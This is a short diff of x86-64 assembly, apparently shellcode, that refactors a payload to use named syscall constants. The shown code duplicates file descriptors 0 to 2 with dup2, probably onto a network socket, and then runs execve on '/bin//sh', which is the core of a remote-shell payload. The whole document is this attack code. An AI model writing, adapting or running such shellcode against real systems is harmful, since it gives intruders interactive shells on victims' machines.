@@ -8,6 +8,8 @@
 BITS 64
 global main
 
+	%include "../include/syscalls64.s"
+
 	section .mytext progbits alloc exec write
 
 main:
@@ -38,7 +40,7 @@ dup2:
 	mov sil,2
 .copy:
 	xor rax,rax
-	mov al,33		;dup2
+	mov al, __NR_dup2	;dup2
 	syscall
 	dec rsi
 	jns dup2.copy
@@ -48,7 +50,7 @@ dup2:
 	push rax
 	mov rdi, 0x68732f2f6e69622f ;/bin/sh
 	push rdi
-	mov al,59 		;execve in unistd_64.h
+	mov al, __NR_execve	;execve
 	mov rdi,rsp
 	xor rsi,rsi
 	xor rdx,rdx
